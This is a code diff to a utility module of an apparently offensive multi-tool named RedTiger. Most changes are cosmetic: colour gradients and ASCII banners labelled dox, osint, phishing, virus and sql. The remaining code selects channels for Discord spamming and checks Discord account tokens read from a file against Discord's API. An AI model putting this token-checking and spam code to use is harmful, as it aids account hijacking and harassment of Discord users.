@@ -27,7 +27,7 @@ except Exception as e:
 
 color_webhook = 0xa80505
 username_webhook = name_tool
-avatar_webhook = "https://media.discordapp.net/attachments/1185940734256357427/1252261629546987550/logo_redtiger.png?ex=66719306&is=66704186&hm=c0cdee4699eb76dd404125866c4130d77ed177426daf71d8c976e5bbcb44c6bd&=&format=webp&quality=lossless&width=810&height=810"
+avatar_webhook = 'https://media.discordapp.net/attachments/1268900329605300234/1270486977539604530/logo_redtiger.png?ex=66b72c73&is=66b5daf3&hm=c26e13dabc0297251613512e6ec2b8c8667550db16769a03cddb66fad8ef7eff&=&format=webp&quality=lossless&width=662&height=662'
 
 colorama.init()
 color = colorama.Fore
@@ -63,6 +63,80 @@ GEN_VALID = f'{BEFORE_GREEN}+{AFTER_GREEN} |'
 GEN_INVALID = f'{BEFORE}x{AFTER} |'
 
 INFO_ADD = f'{white}[{red}+{white}]{red}'
+
+
+def MainColor(text):
+    start_color = (168, 5, 5)  
+    end_color = (255, 118, 118)
+
+    num_steps = 9
+
+    colors = []
+    for i in range(num_steps):
+        r = start_color[0] + (end_color[0] - start_color[0]) * i // (num_steps - 1)
+        g = start_color[1] + (end_color[1] - start_color[1]) * i // (num_steps - 1)
+        b = start_color[2] + (end_color[2] - start_color[2]) * i // (num_steps - 1)
+        colors.append((r, g, b))
+    
+    colors += list(reversed(colors[:-1]))  
+    
+    gradient_chars = '┴┼┘┤└┐─┬├┌└│]░▒░▒█▓▄▌▀()'
+    
+    def text_color(r, g, b):
+        return f"\033[38;2;{r};{g};{b}m"
+       
+    lines = text.split('\n')
+    num_colors = len(colors)
+    
+    result = []
+    for i, line in enumerate(lines):
+        for j, char in enumerate(line):
+            if char in gradient_chars:
+                color_index = (i + j) % num_colors
+                color = colors[color_index]
+                result.append(text_color(*color) + char + "\033[0m")
+            else:
+                result.append(char)
+        if i < len(lines) - 1:
+            result.append('\n')
+    
+    return ''.join(result)
+
+
+
+def MainColor2(text):
+    start_color = (168, 5, 5)  
+    end_color = (255, 118, 118)
+
+    num_steps = 9
+
+    colors = []
+    for i in range(num_steps):
+        r = start_color[0] + (end_color[0] - start_color[0]) * i // (num_steps - 1)
+        g = start_color[1] + (end_color[1] - start_color[1]) * i // (num_steps - 1)
+        b = start_color[2] + (end_color[2] - start_color[2]) * i // (num_steps - 1)
+        colors.append((r, g, b))
+    
+    colors += list(reversed(colors[:-1]))  
+    
+    def text_color(r, g, b):
+        return f"\033[38;2;{r};{g};{b}m"
+       
+    lines = text.split('\n')
+    num_colors = len(colors)
+    
+    result = []
+    for i, line in enumerate(lines):
+        for j, char in enumerate(line):
+            color_index = (i + j) % num_colors
+            color = colors[color_index]
+            result.append(text_color(*color) + char + "\033[0m")
+        
+        if i < len(lines) - 1:
+            result.append('\n')
+    
+    return ''.join(result)
+
 
 def Censored(text):
     censored = ["loxy", website, creator]
@@ -208,8 +282,8 @@ def CheckWebhook(webhook):
 
 def ChoiceMultiChannelDiscord():
     try:
-        num_channels = int(input(f"{INPUT} How many spam channels -> {reset}"))
-    except ValueError:
+        num_channels = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} How many spam channels -> {reset}"))
+    except:
         ErrorNumber()
     
     selected_channels = [] 
@@ -217,7 +291,7 @@ def ChoiceMultiChannelDiscord():
     for _ in range(num_channels):
         try:
             number += 1
-            selected_channel_number = input(f"{color.RED}{INPUT} Channel Id {number}/{num_channels} -> {color.RESET}")
+            selected_channel_number = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Channel Id {number}/{num_channels} -> {reset}")
             selected_channels.append(selected_channel_number)
         except:
             ErrorId()
@@ -228,17 +302,16 @@ def ChoiceMultiChannelDiscord():
 def ChoiceMultiTokenDisord():
 
     def CheckToken(token_number, token):
-        r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
-        if r.status_code == 200:
-            status = f"Valid"
+        response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
+        
+        if response.status_code == 200:
             user = requests.get(
                 'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
             username_discord = user['username']
             token_sensur = token[:-25] + '.' * 3
-            print(f"{white}[{red}{token_number}{white}]{red} -> {red}Status: {white}{status}{red} | User: {white}{username_discord}{red} | Token: {white}{token_sensur}")
+            print(f" {BEFORE}{token_number}{AFTER} -> {red}Status: {white}Valid{red} | User: {white}{username_discord}{red} | Token: {white}{token_sensur}")
         else:
-            status = f"Invalid"
-            print(f"{white}[{red}{token_number}{white}]{red} -> {red}Status: {white}{status}{red} | {red}Token: {white}{token}")
+            print(f" {BEFORE}{token_number}{AFTER} -> {red}Status: {white}Invalid{red} | {red}Token: {white}{token}")
 
     file_token_discord = "./2-Input/TokenDisc/TokenDisc.txt"
     tokens = {}
@@ -251,14 +324,14 @@ def ChoiceMultiTokenDisord():
             token_discord_number += 1
         
         if token_discord_number == 0:
-            print(f"{INFO} No Token Discord in file: {white}{file_token_discord}{red} Please add tokens to the file.")
+            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No Token Discord in file: {white}{file_token_discord}{red} Please add tokens to the file.")
             Continue()
             Reset()
         else:
-            print(f"{INFO} {white}{token_discord_number}{red} Token Discord found ({white}{file_token_discord}{red})")
+            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} {white}{token_discord_number}{red} Token Discord found ({white}{file_token_discord}{red})")
     
     try:
-        num_tokens = int(input(f"{INPUT} How many token (max {token_discord_number}) -> {reset}"))
+        num_tokens = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} How many token (max {token_discord_number}) -> {reset}"))
         if num_tokens > token_discord_number:
             ErrorNumber()
     except:
@@ -267,7 +340,7 @@ def ChoiceMultiTokenDisord():
     token_discord_number = 0
     with open(file_token_discord, 'r') as file_token:
         print()
-        print(f"{red}Token Discord ({white}{file_token_discord}{red}):")
+        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Token Discord ({white}{file_token_discord}{red}):\n")
         for line in file_token:
             if not line.strip() or line.isspace():
                 continue
@@ -283,7 +356,7 @@ def ChoiceMultiTokenDisord():
     for _ in range(num_tokens):
         try:
             number += 1
-            selected_token_number = int(input(f"{color.RED}{INPUT} Token Number {number}/{num_tokens} -> {color.RESET}"))
+            selected_token_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Token Number {number}/{num_tokens} -> {reset}"))
         except:
             ErrorNumber()
         
@@ -297,24 +370,23 @@ def ChoiceMultiTokenDisord():
 
 def Choice1TokenDiscord():
     def CheckToken(token_number, token):
-        r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
-        if r.status_code == 200:
-            status = f"Valid"
+        response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
+        
+        if response.status_code == 200:
             user = requests.get(
                 'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
             username_discord = user['username']
             token_sensur = token[:-25] + '.' * 3
-            print(f"{white}[{red}{token_number}{white}]{red} -> {red}Status: {white}{status}{red} | User: {white}{username_discord}{red} | Token: {white}{token_sensur}")
+            print(f" {BEFORE}{token_number}{AFTER} -> {red}Status: {white}Valid{red} | User: {white}{username_discord}{red} | Token: {white}{token_sensur}")
         else:
-            status = f"Invalid"
-            print(f"{white}[{red}{token_number}{white}]{red} -> {red}Status: {white}{status}{red} | {red}Token: {white}{token}")
+            print(f" {BEFORE}{token_number}{AFTER} -> {red}Status: {white}Invalid{red} | {red}Token: {white}{token}")
 
     file_token_discord = "./2-Input/TokenDisc/TokenDisc.txt"
     tokens = {}
     token_discord_number = 0
 
     with open(file_token_discord, 'r') as file_token:
-        print(f"{red}Token Discord ({white}{file_token_discord}{red}):")
+        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Token Discord ({white}{file_token_discord}{red}):\n")
         for line in file_token:
             if not line.strip() or line.isspace():
                 continue
@@ -325,13 +397,13 @@ def Choice1TokenDiscord():
             CheckToken(token_discord_number, modified_token)
 
     if not tokens:
-        print(f"{INFO} No Token Discord in file: {white}{file_token_discord}{red} Please add tokens to the file.")
+        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No Token Discord in file: {white}{file_token_discord}{red} Please add tokens to the file.")
         Continue()
         Reset()
         return None
 
     try:
-        selected_token_number = int(input(f"\n{color.RED}{INPUT} Token Number -> {color.RESET}"))
+        selected_token_number = int(input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Token Number -> {reset}"))
     except:
         ErrorChoice()
 
@@ -347,100 +419,97 @@ def Choice1TokenDiscord():
     return selected_token
 
 
-def BrowserPrivate(site, search_bar=True, title="Navigateur Web"):
-    try:
-        from PyQt5.QtWidgets import QApplication, QMainWindow, QLineEdit, QVBoxLayout, QWidget
-        from PyQt5.QtGui import QIcon
-        from PyQt5.QtCore import QUrl, Qt
-        from PyQt5.QtWebEngineWidgets import QWebEngineView
-    except Exception as e:
-        ErrorModule(e)
+dox_banner = MainColor2(r"""                                            
+                  .:+*#%%#####*++++-.             
+                :#%%*+*+-.....                    
+             .=%%+++:..                           
+           .=%#++=.                               
+          -%%+++.                                 
+      .  =%%++-          ....                     
+      #%+#%++=.        .:#%%%*:                   
+      :#@%#+=          :*+:-*%#:                  
+       .*@@#.         .-%*::-%%#.                 
+        .-%@@%-.      .=%%--%%%-                  
+          .:--=*+-:.:-#%%%%%%%%*.                      ██████╗   ██████╗  ██╗  ██╗
+               .:-*#%%%%%%%%%%%%%-                     ██╔══██╗ ██╔═══██╗ ╚██╗██╔╝
+                  .+%%%*+*%%%%%%%%+...                 ██║  ██║ ██║   ██║  ╚███╔╝ 
+                  .+%@@%%%%*#%%%%%%%%%*-.              ██║  ██║ ██║   ██║  ██╔██╗
+                   .*%@%%%%%%%%%%%%%%%%%#-.            ██████╔╝ ╚██████╔╝ ██╔╝ ██╗
+                   .*%%%%%%%%%%%+#%%%%%%%%%*-.         ╚═════╝   ╚═════╝  ╚═╝  ╚═╝
+                  .=%%%%%%%%%%%%@%*%%%%%####=-==  
+                  :*%%%%%%%%%%%%%%%*#%%%%#+=-==+  
+                 .+=*%#%%%%%%%%%%%%%**%%#+**+-:-  
+                .-=::*-%%%%%%%%%%%%###*-*%###+:   
+                ...:..%%%%%%%%%%%%%%#:=*+-:.      
+                     *%%%%%%%%%%%%%%%%.           
+                    :#%%%%%%%%%%%%%%%%+           
+                   .*%%%%%%%%%%%%%%%%%#.          
+                  .=%%%%%%%%%%%%%%%%%%#:          
+                  .+%%%%%%%%%%%%%%%%%%%*.         
+                    :+*#%%%@%%%%%%%%%%%%#:.       
+                      ..:==+*#%#*=-:.:-+***:.""")
 
-    class WebBrowserApp(QMainWindow):
-        def __init__(self, url=None, width=1000, height=300, search_bar=True, title="Navigateur Web"):
-            super().__init__()
-            self.setWindowTitle(title)
 
-            self.search_bar = search_bar
-            self.url_entry = QLineEdit()
-            self.url_entry.returnPressed.connect(self.load_url)
-            self.url_entry.setText(url or "") 
-            self.url_entry.setVisible(self.search_bar)
+osint_banner = MainColor2(r"""                                                                                                
+                                          ...:----:...                                              
+                                     .:=#@@@@@@@@@@@@@@%*-..                                        
+                                  .:#@@@@@@@%#*****#%@@@@@@@+..                                     
+                               ..-@@@@@%-...... ........+@@@@@@..                                   
+                               :%@@@@=..   .#@@@@@@@@#=....+@@@@*.                                  
+                             .+@@@@=.      .*@@@%@@@@@@@@=...*@@@@:.                                
+                            .#@@@%.                 .=@@@@@=. .@@@@-.                               
+                           .=@@@#.                    .:%@@@*. -@@@%:.                              
+                           .%@@@-                       .*@@*. .+@@@=.                              
+                           :@@@#.                              .-@@@#.                              
+                           -@@@#                                :%@@@.                              
+                           :@@@#.                              .-@@@#.                              
+                           .%@@@-.                             .+@@@=.                              
+                           .+@@@#.                             -@@@%:.                              
+                            .*@@@%.                          .:@@@@-.                               
+                             .+@@@@=..                     ..*@@@@:.                                
+                               :%@@@@-..                ...+@@@@*.                                  
+                               ..-@@@@@%=...         ...*@@@@@@@@#.                                 
+                                  .:*@@@@@@@%*++++**@@@@@@@@=:*@@@@#:.                              
+                                     ..=%@@@@@@@@@@@@@@%#-.   ..*@@@@%:.                            
+                                        .....:::::::....       ...+@@@@%:                           
+                                                                  ..+@@@@%-.                        
+                                                                    ..=@@@@%-.                      
+                                                                      ..=@@@@@=.                    
+                                                                         .=%@@@@=.                  
+                                                                          ..-%@@@-.                 
+                                                                             ....""")
 
-            self.webview = QWebEngineView()
+wifi_banner = MainColor2(r"""
+                                                 @@@@@@@@@@@@@@@@@@@                                 
+                                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                         
+                                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                    
+                                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
+                             @@@@@@@@@@@@@@@@@@                       @@@@@@@@@@@@@@@@@@             
+                           @@@@@@@@@@@@@@                                   @@@@@@@@@@@@@@@          
+                        @@@@@@@@@@@@@              @@@@@@@@@@@@@@@              @@@@@@@@@@@@@        
+                       @@@@@@@@@@@          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@          @@@@@@@@@@@       
+                       @@@@@@@@         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         @@@@@@@@       
+                        @@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@        
+                                  @@@@@@@@@@@@@@@                   @@@@@@@@@@@@@@@                  
+                                @@@@@@@@@@@@@                           @@@@@@@@@@@@@                
+                               @@@@@@@@@@            @@@@@@@@@@@            @@@@@@@@@@               
+                                @@@@@@@         @@@@@@@@@@@@@@@@@@@@@         @@@@@@@                
+                                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                            
+                                          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
+                                         @@@@@@@@@@@             @@@@@@@@@@@                         
+                                        @@@@@@@@@                   @@@@@@@@@                        
+                                         @@@@@@        @@@@@@@        @@@@@@                         
+                                                    @@@@@@@@@@@@@                                    
+                                                   @@@@@@@@@@@@@@@                                   
+                                                  @@@@@@@@@@@@@@@@@                                  
+                                                  @@@@@@@@@@@@@@@@@                                  
+                                                   @@@@@@@@@@@@@@@                                   
+                                                    @@@@@@@@@@@@@                                    
+                                                       @@@@@@@                                       
+""")
 
-            layout = QVBoxLayout()
-            if self.search_bar:
-                layout.addWidget(self.url_entry)
-            layout.addWidget(self.webview)
 
-            central_widget = QWidget()
-            central_widget.setLayout(layout)
-            self.setCentralWidget(central_widget)
-
-            if url:
-                self.load_url()
-            logo = "./Img/RedTiger_Icon.ico"
-            self.setWindowIcon(QIcon(logo))
-
-            self.setWindowFlags(Qt.Window | Qt.CustomizeWindowHint | Qt.WindowMinMaxButtonsHint | Qt.WindowCloseButtonHint)
-
-        def toggle_search_bar(self, visible):
-            self.url_entry.setVisible(visible)
-
-        def load_url(self):
-            url = self.url_entry.text()
-            if url:
-                self.webview.load(QUrl(url))
-
-        def contextMenuEvent(self, event):
-            pass 
-
-    def main():
-        app = QApplication(sys.argv)
-        app.setStyleSheet("""
-            QMainWindow {
-                background-color: #1c1c1c;
-                color: #ffffff;
-            }
-            QLineEdit {
-                background-color: #333333;
-                color: #ffffff;
-                border: 1px solid #555555;
-                padding: 5px;
-            }
-            QWebEngineView {
-                background-color: #1c1c1c;
-                color: #ffffff;
-                border: none;
-            }
-        """)
-        browser = WebBrowserApp(url=site, width=500, height=10, search_bar=search_bar, title=f"{name_tool} {version_tool} | {title}")  # Utiliser directement le titre
-        browser.show()
-        sys.exit(app.exec_())
-
-    main()
-
-url_banner = red + r"""
-                   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
-                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-                  @@@@                                                    @@@@                     @@@@
-                  @@@@                                                    @@@@       @@@@@          @@@
-                  @@@@   @@@@ @@@@  @@@@@@@@  @@@   @@@ @@@@  @@@  @@@@   @@@@    @@@@@@@@@@@       @@@
-                  @@@@   @@@@ @@@@  @@@ @@@@@ @@@@ @@@@ @@@@ @@@@  @@@@   @@@@  @@@@@@   @@@@@      @@@
-                  @@@@   @@@@ @@@@@@@@@  @@@@@@@@@@@@@@ @@@@@@@@@@@@@@    @@@@  @@@@       @@@@     @@@
-                  @@@@    @@@@@@@@@@@@@   @@@@@@@@@@@@   @@@@@@@@@@@@@    @@@@  @@@@       @@@@     @@@
-                  @@@@    @@@@@@@@@@@@    @@@@@@@@@@@@    @@@@@@@@@@@     @@@@  @@@@@     @@@@@     @@@
-                  @@@@    @@@@@@@@@@@@    @@@@@@@@@@@     @@@@@@@@@@@     @@@@   @@@@@@@@@@@@@      @@@
-                  @@@@     @@@@@@@@@@@    @@@@@@@@@@@     @@@@@ @@@@@     @@@@     @@@@@@@@@@@@@    @@@
-                  @@@@     @@@@@ @@@@      @@@@ @@@@@     @@@@@ @@@@      @@@@               @@@@@  @@@
-                  @@@@      @@@   @@        @@   @@@       @@@   @@       @@@@                 @@@  @@@
-                  @@@@                                                    @@@@                     @@@@
-                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
-"""
-
-phishing_banner = red + r"""
+phishing_banner = MainColor2(r"""
                                                          .+#%@@%#+.                                     
                                                     .#@@@@@@@@@@@@@@@@#.                                
                                                   +@@@@@@@@@@@@@@@@@@@@@@*                              
@@ -464,9 +533,9 @@ phishing_banner = red + r"""
                                         -@@@@@@@@@@@@@@@@@@@%#*%@@@@@@@@@@@@@@@@@@@-                    
                                         -@@@@@@@@@@@@@@@@@@@%::%@@@@@@@@@@@@@@@@@@@-                    
                                         -@@@@@@@@@@@@@@@@@@@%::%@@@@@@@@@@@@@@@@@@@-                    
-                                        -@@@@@@@@@@@@@@@@@@@%::%@@@@@@@@@@@@@@@@@@@-  """
+                                        -@@@@@@@@@@@@@@@@@@@%::%@@@@@@@@@@@@@@@@@@@-  """)
 
-decrypted_banner = red + r"""
+decrypted_banner = MainColor2(r"""
                                          ^M@@@@@@@@@v                                    
                                       v@@@@@@@@@@@@@@@@@                                 
                                     _@@@@@@@}    ;a@@@@@@@                               
@@ -487,10 +556,10 @@ decrypted_banner = red + r"""
                                              @@@@@@@@@@@@@@@@@_   @@@@@@@@@@@@@@@@@      
                                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      
                                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|      
-                                               ^@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@O  """
+                                               ^@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@O  """)
 
 
-encrypted_banner = red + r"""
+encrypted_banner = MainColor2(r"""
                                                        j@@@@@^                                 
                            _@v   p@@@@j           j@@@@@@@@@@@@@@@;          |@@@@M   v@}      
                           @@@@@} >@@@@    v@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@p    @@@@_ _@@@@@     
@@ -511,11 +580,10 @@ encrypted_banner = red + r"""
                                          ^@@@@@@@@@   v@_   O@}       M@@_                     
                                             ;         p@|   O@}      }}                        
                                                     >@@@@@  O@@@@@@@@@@@J                      
-                                                     p@@@j         ;@@@@^                      """
+                                                     p@@@j         ;@@@@^                      """)
 
 
-
-scan_banner = red + r"""
+scan_banner = MainColor2(r"""
                                                             >@@|                                                
                                                             >@@|                                                
                                                             >@@|                                                
@@ -539,11 +607,11 @@ scan_banner = red + r"""
                                                             >@@|                                                
                                                             >@@|                                                
                                                             >@@| 
-"""
+""")
 
 
 
-sql_banner = red + r"""
+sql_banner = MainColor2(r"""
                                                                                    ^                      
                                                                                  J@@M                     
                                                                         ^         @@@@^                   
@@ -569,11 +637,11 @@ sql_banner = red + r"""
                                ;@@@p;                                                                     
                             >p@@M>                                                                        
                            }@@>                                                                          
-"""
+""")
 
 
 
-map_banner = red + r"""
+map_banner = MainColor2(r"""
                                       :**+ :::+*@@.                                                         
                               +: @ = =.  :#@@@@@@@@                 :     .=*@@#     -                      
                  @@@@-. :=: +@@.:% *=@@:   @@@@@@          :#=::     .:@=@@@@@@@@@@@@@@@@@@@@--.-:          
@@ -600,11 +668,11 @@ map_banner = red + r"""
                                 .@@@@@                                                           =@@@:    @=
                                  =@@                                                              =    #+   
                                   @%                                                                        
-"""
+""")
 
 
 
-virus_banner = red + r"""
+virus_banner = MainColor2(r"""
                                                          ...                                       
                                                   +%@@@@@@@@@@@@@*.                                
                                                #@@@@@@@@@@@@@@@@@@@@@:                             
@@ -628,11 +696,11 @@ virus_banner = red + r"""
                                        -@@@@@@@@%=                :#@@@@@@@@*                      
                                          *@@@@@:                     %@@@@@:                       
                                          :%@@%.                       *@@@=                       
-"""
+""")
 
 
 
-logo_banner = red + r"""
+logo_banner = r"""
                                          █████████████████████████████████████                                        
                                    ██████                  █                  ██████                                   
                                ██████                                             ██████                               
